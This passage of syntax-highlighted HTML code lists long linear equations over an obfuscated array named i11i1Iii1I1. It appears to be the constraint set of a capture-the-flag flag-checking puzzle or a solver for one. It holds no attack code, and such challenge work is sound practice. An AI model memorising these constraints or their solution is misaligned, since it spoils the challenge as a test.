punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">52041</span><span class="token punctuation">,</span>
         <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">46</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">20253</span><span class="token punctuation">,</span>
         <span class="token number">45</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">56</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">650</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">900</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">406</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">651</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">18768</span><span class="token punctuation">,</span>
         <span class="token number">555</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">510</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">90</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">499</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">610</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">221</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">102</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2050</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">406</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">665</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">609</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">111844</span><span class="token punctuation">,</span>
         <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4444</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5555</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">676</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">660</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">73</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">107</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">159029</span><span class="token punctuation">,</span>
         <span class="token number">520</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">222</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">56655</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">60</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">220</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1007</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2500</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">605</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">390</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">609</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99999</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">210</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">232</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2762025</span><span class="token punctuation">,</span>
         <span class="token number">1323</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">55</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">660</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">220</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2500</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">605</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">390</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">609</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9999</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">210</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">232</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1551621</span><span class="token punctuation">,</span>
         <span class="token number">777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6969</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">55</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">60</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">220</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">609</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">999</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">232</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">948348</span><span class="token punctuation">,</span>
         <span class="token number">97</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6969</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">56</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">60</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token 